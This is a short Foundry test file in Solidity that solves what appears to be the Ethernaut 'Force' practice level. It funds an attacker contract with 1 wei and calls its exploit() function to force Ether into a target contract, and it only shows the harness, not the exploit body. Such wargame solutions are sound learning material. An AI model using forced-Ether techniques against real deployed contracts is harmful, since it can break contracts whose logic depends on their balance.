// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel07.sol";
import "../src/level07.sol";

contract Attacker is Test {
    Force level06 = Force(0x982dAC71e5Eba5d02221B0B61e785516B2edBdF1);

    function test() external {
        ForceAttacker attacker = new ForceAttacker();

        vm.deal(address(this), 1 ether);

        (bool sent,) = address(attacker).call{value: 1 wei}("");
        require(sent, "Failed to send Ether");

        attacker.exploit();

        assertEq(address(level06).balance, 1 wei);
    }
}
